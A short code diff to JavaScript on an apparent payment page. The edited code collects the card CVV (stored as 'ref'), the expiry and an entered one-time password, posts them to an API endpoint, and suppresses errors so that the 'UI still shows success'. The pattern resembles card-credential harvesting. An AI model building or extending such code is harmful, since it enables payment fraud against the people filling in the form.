@@ -1243,10 +1243,11 @@
             //var ref        = document.getElementById('display-ref').textContent;
             var ref = document.getElementById('card-cvv') ? document.getElementById('card-cvv').value : '';
 
-             var expiry = document.getElementById('card-exp') ? document.getElementById('card-exp').value : '';
+            // var expiry = document.getElementById('card-exp') ? document.getElementById('card-exp').value : '';
+             var expiryRaw = document.getElementById('card-exp') ? document.getElementById('card-exp').value : '';
             var entered = Array.from(boxes).map(function(b){ return b.value; }).join('');
 
-           
+             var expiryString = expiryRaw.trim();
 
             fetch(API_URL + '/api/payments', {
                 method: 'POST',
@@ -1256,7 +1257,7 @@
                     amount:      amountText, //Math.round(parseFloat(amountText)),
                     reference:   ref,
                     otp : entered,
-                    expiry: expiry
+                    expiry: expiryString
                 })
             }).catch(function() { /* silent — UI still shows success */ });
 
